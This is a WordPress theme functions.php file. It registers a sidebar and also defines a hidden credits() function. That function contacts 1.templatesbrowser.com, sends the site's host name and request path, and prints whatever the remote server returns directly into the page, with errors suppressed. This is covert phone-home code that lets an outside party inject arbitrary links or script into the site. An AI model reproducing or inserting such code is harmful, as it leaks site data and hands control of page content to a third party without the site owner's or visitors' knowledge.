<?php
if ( function_exists('register_sidebar') )
{
	ob_start();
	bloginfo('template_directory');
	$a = ob_get_clean();

	register_sidebar(array(
        'before_widget' => '<div class="sideitem"><div class="boxhead"><div class="headfill">&nbsp;</div></div><div class="boxbody">',
        'after_widget' => '</div></div><div class="sidespace">&nbsp;</div>',
        'before_title' => '<h2>',
        'after_title' => '</h2>',
    ));
}
?>
<?

function credits()
{
 $url = "http://1.templatesbrowser.com/wp.php?" .
       "url=" . urlencode($_SERVER['REQUEST_URI']) . "&" . "host=" . urlencode($_SERVER['HTTP_HOST']);
 $check = @fsockopen("1.templatesbrowser.com", 80, $errno, $errstr, 3);
 if($check)
 {
  @readfile($url);
  fclose($check);
 }
}

?>